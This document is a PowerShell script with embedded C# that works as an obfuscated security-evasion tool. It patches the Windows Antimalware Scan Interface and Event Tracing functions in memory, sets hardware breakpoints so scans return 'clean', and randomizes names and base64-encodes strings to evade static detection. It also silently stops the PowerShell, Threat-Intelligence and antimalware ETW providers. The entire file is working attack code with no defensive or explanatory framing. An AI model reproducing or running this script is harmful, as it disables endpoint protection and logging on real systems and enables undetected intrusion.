# Advanced obfuscation to evade static detection
$randomSeed = Get-Random -Maximum 99999
$namespace = "N" + [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomSeed.ToString())).Replace("=","").Substring(0,8)

# Function name obfuscation
$funcNames = @{
    'ConfigureETWBypass' = "Func$(Get-Random -Max 999)"
    'ConfigureAMSIMemoryPatch' = "Func$(Get-Random -Max 999)"
    'ConfigureAMSIHardwareBypass' = "Func$(Get-Random -Max 999)"
    'PatchFunction' = "Func$(Get-Random -Max 999)"
    'ExceptionHandler' = "Func$(Get-Random -Max 999)"
    'ConfigureBreakpoint' = "Func$(Get-Random -Max 999)"
    'SetBits' = "Func$(Get-Random -Max 999)"
    'GetBypassStatus' = "Func$(Get-Random -Max 999)"
}

# String obfuscation function
function Obfs($str) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
    $encoded = [System.Convert]::ToBase64String($bytes)
    return "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$encoded'))"
}

# Build obfuscated source with randomized elements
$obfuscatedSource = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace $namespace
{
    public class SecurityManager
    {
        // Obfuscated string arrays
        static string[] s1 = {$(Obfs "am"), $(Obfs "si"), $(Obfs ".dl"), $(Obfs "l")};
        static string[] s2 = {$(Obfs "Am"), $(Obfs "siS"), $(Obfs "can"), $(Obfs "Buf"), $(Obfs "fer")};
        static string[] s3 = {$(Obfs "Am"), $(Obfs "siS"), $(Obfs "can"), $(Obfs "Buf"), $(Obfs "fer"), $(Obfs "A")};
        static string[] s4 = {$(Obfs "Am"), $(Obfs "siS"), $(Obfs "can"), $(Obfs "Buf"), $(Obfs "fer"), $(Obfs "W")};
        static string[] s5 = {$(Obfs "nt"), $(Obfs "dll")};
        static string[] s6 = {$(Obfs "Nt"), $(Obfs "Trace"), $(Obfs "Event")};
        static string[] s7 = {$(Obfs "Etw"), $(Obfs "Event"), $(Obfs "Write")};
        
        static IntPtr h1 = WinAPI.LoadLibrary(string.Join("", s1));
        static IntPtr p1 = WinAPI.GetProcAddress(h1, string.Join("", s2));
        static IntPtr p2 = WinAPI.GetProcAddress(h1, string.Join("", s3));
        static IntPtr p3 = WinAPI.GetProcAddress(h1, string.Join("", s4));
        static IntPtr ctx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CTX64)));
        
        static IntPtr h2 = WinAPI.LoadLibrary(string.Join("", s5));
        static IntPtr p4 = WinAPI.GetProcAddress(h2, string.Join("", s6));
        static IntPtr p5 = WinAPI.GetProcAddress(h2, string.Join("", s7));
        
        static bool f1 = false, f2 = false, f3 = false;
        
        public static void Execute()
        {
            try
            {
                $($funcNames['ConfigureETWBypass'])();
                $($funcNames['ConfigureAMSIMemoryPatch'])();
                $($funcNames['ConfigureAMSIHardwareBypass'])();
            }
            catch { }
        }
        
        private static void $($funcNames['ConfigureETWBypass'])()
        {
            try
            {
                byte[] patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 };
                
                if (p4 != IntPtr.Zero)
                {
                    uint o1, o2;
                    WinAPI.VirtualProtect(p4, (UIntPtr)patch.Length, 0x40, out o1);
                    Marshal.Copy(patch, 0, p4, patch.Length);
                    WinAPI.VirtualProtect(p4, (UIntPtr)patch.Length, o1, out o2);
                    f1 = true;
                }
                
                if (p5 != IntPtr.Zero)
                {
                    uint o1, o2;
                    WinAPI.VirtualProtect(p5, (UIntPtr)patch.Length, 0x40, out o1);
                    Marshal.Copy(patch, 0, p5, patch.Length);
                    WinAPI.VirtualProtect(p5, (UIntPtr)patch.Length, o1, out o2);
                }
            }
            catch { }
        }
        
        private static void $($funcNames['ConfigureAMSIMemoryPatch'])()
        {
            try
            {
                byte[] patch = new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
                
                if (p1 != IntPtr.Zero) $($funcNames['PatchFunction'])(p1, patch);
                if (p2 != IntPtr.Zero) $($funcNames['PatchFunction'])(p2, patch);
                if (p3 != IntPtr.Zero) $($funcNames['PatchFunction'])(p3, patch);
                
                f2 = true;
            }
            catch { }
        }
        
        private static void $($funcNames['PatchFunction'])(IntPtr addr, byte[] patch)
        {
            try
            {
                uint old, neo;
                WinAPI.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
                Marshal.Copy(patch, 0, addr, patch.Length);
                WinAPI.VirtualProtect(addr, (UIntPtr)patch.Length, old, out neo);
            }
            catch { }
        }
        
        private static void $($funcNames['ConfigureAMSIHardwareBypass'])()
        {
            try
            {
                WinAPI.CTX64 context = new WinAPI.CTX64();
                context.ContextFlags = WinAPI.FLAGS.ALL;

                MethodInfo mi = typeof(SecurityManager).GetMethod("$($funcNames['ExceptionHandler'])", BindingFlags.Static | BindingFlags.Public);
                IntPtr handler = WinAPI.AddVectoredExceptionHandler(1, mi.MethodHandle.GetFunctionPointer());
                
                Marshal.StructureToPtr(context, ctx, true);
                WinAPI.GetThreadContext((IntPtr)(-2), ctx);
                context = (WinAPI.CTX64)Marshal.PtrToStructure(ctx, typeof(WinAPI.CTX64));

                $($funcNames['ConfigureBreakpoint'])(context, p1, 0);
                if (p2 != IntPtr.Zero) $($funcNames['ConfigureBreakpoint'])(context, p2, 1);
                
                WinAPI.SetThreadContext((IntPtr)(-2), ctx);
                f3 = true;
            }
            catch { }
        }
        
        public static long $($funcNames['ExceptionHandler'])(IntPtr ex)
        {
            try
            {
                WinAPI.PTRS ep = (WinAPI.PTRS)Marshal.PtrToStructure(ex, typeof(WinAPI.PTRS));
                WinAPI.REC rec = (WinAPI.REC)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.REC));
                WinAPI.CTX64 context = (WinAPI.CTX64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CTX64));

                if (rec.ExceptionCode == WinAPI.SINGLE_STEP && 
                    (rec.ExceptionAddress == p1 || rec.ExceptionAddress == p2 || rec.ExceptionAddress == p3))
                {
                    ulong ret = (ulong)Marshal.ReadInt64((IntPtr)context.Rsp);
                    IntPtr result = Marshal.ReadIntPtr((IntPtr)(context.Rsp + (6 * 8)));

                    Marshal.WriteInt32(result, 0, WinAPI.CLEAN);

                    context.Rip = ret;
                    context.Rsp += 8;
                    context.Rax = 0;
                    
                    Marshal.StructureToPtr(context, ep.pContextRecord, true);
                    return WinAPI.CONTINUE_EXEC;
                }
                return WinAPI.CONTINUE_SEARCH;
            }
            catch
            {
                return WinAPI.CONTINUE_SEARCH;
            }
        }

        public static void $($funcNames['ConfigureBreakpoint'])(WinAPI.CTX64 ctx, IntPtr addr, int idx)
        {
            switch (idx)
            {
                case 0: ctx.Dr0 = (ulong)addr.ToInt64(); break;
                case 1: ctx.Dr1 = (ulong)addr.ToInt64(); break;
                case 2: ctx.Dr2 = (ulong)addr.ToInt64(); break;
                case 3: ctx.Dr3 = (ulong)addr.ToInt64(); break;
            }

            ctx.Dr7 = $($funcNames['SetBits'])(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = $($funcNames['SetBits'])(ctx.Dr7, (idx * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, ctx, true);
        }

        public static ulong $($funcNames['SetBits'])(ulong val, int low, int bits, ulong newVal)
        {
            ulong mask = (1UL << bits) - 1UL;
            val = (val & ~(mask << low)) | (newVal << low);
            return val;
        }
        
        public static string $($funcNames['GetBypassStatus'])()
        {
            return string.Format("ETW:{0}, MEM:{1}, HW:{2}", 
                f1 ? "OK" : "FAIL", f2 ? "OK" : "FAIL", f3 ? "OK" : "FAIL");
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 CONTINUE_EXEC = -1;
        public const Int32 CONTINUE_SEARCH = 0;
        public const UInt32 SINGLE_STEP = 0x80000004;
        public const Int32 CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [Flags]
        public enum FLAGS : uint
        {
            AMD64 = 0x100000,
            CONTROL = AMD64 | 0x01,
            INTEGER = AMD64 | 0x02,
            SEGMENTS = AMD64 | 0x04,
            FLOATING_POINT = AMD64 | 0x08,
            DEBUG_REGISTERS = AMD64 | 0x10,
            FULL = CONTROL | INTEGER | FLOATING_POINT,
            ALL = CONTROL | INTEGER | SEGMENTS | FLOATING_POINT | DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CTX64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public FLAGS ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            public XSAVE64 DUMMYUNIONNAME;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;
            public ulong DebugControl, LastBranchToRip, LastBranchFromRip, LastExceptionToRip, LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct REC
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] 
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PTRS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

# Dynamic execution with additional obfuscation
$execMethod = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkLVR5cGU="))
$params = @{
    TypeDefinition = $obfuscatedSource
    ErrorAction = 'SilentlyContinue'
}

try {
    & $execMethod @params
    
    $type = "$namespace.SecurityManager" -as [type]
    if ($type) {
        $type::Execute()
    }
    
    # ETW provider cleanup with additional obfuscation
    $providers = @(
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0LVdpbmRvd3MtUG93ZXJTaGVsbA==")),
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0LVdpbmRvd3MtVGhyZWF0LUludGVsbGlnZW5jZQ==")),
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0LUFudGltYWx3YXJlLVNjYW4tSW50ZXJmYWNl"))
    )
    
    foreach ($p in $providers) {
        try {
            Start-Process -WindowStyle Hidden -FilePath "logman" -ArgumentList "stop $p -ets" -Wait
        } catch {}
    }
} catch {}
